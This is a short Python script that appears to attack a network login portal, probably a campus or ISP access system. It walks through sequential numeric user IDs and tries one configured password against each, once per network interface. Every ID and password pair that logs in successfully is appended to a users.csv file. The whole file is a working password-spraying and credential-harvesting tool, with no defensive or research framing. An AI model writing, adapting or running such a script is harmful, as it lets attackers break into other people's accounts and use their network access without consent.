import sys
import cucommon
import userfinderconfig

user_num = userfinderconfig.user_num
begin = userfinderconfig.begin
password = userfinderconfig.password
INTERFACES = userfinderconfig.interfaces

if __name__ == '__main__':
    logger = cucommon.get_logger('/tmp/userfinder.log')

    current_user = begin
    info = cucommon.IfInfo()
    for interface in INTERFACES:
        ip = info.get_ip(interface, logger)
        success = False
        while not success and current_user - begin < user_num:
            result = cucommon.login(str(current_user), password, ip, logger)
            try:
                msg = result['msg']
                success = result['success'] == 'true'
                logger.info('Result: %s %s', current_user, msg)
                if success is True:
                    with open(sys.path[0] + '/users.csv', 'a') as file:
                        file.write(str(current_user) + "," + password + "\n")
                if msg == 'connection created':
                    success = True
                    current_user -= 1
            except:
                logger.error('Result: %s network error', current_user)
            finally:
                current_user += 1
